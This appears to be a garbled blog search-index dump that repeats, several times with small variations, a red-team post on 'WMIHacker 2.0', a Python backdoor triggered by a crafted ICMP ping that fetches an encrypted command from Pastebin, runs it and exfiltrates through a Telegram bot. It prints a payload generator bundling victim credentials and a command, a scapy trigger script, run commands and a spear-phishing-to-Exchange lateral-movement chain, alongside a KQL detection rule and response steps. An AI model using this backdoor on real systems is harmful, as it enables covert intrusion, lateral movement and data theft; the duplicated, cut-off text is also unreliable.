script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nShown above is the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can is the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see is the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for 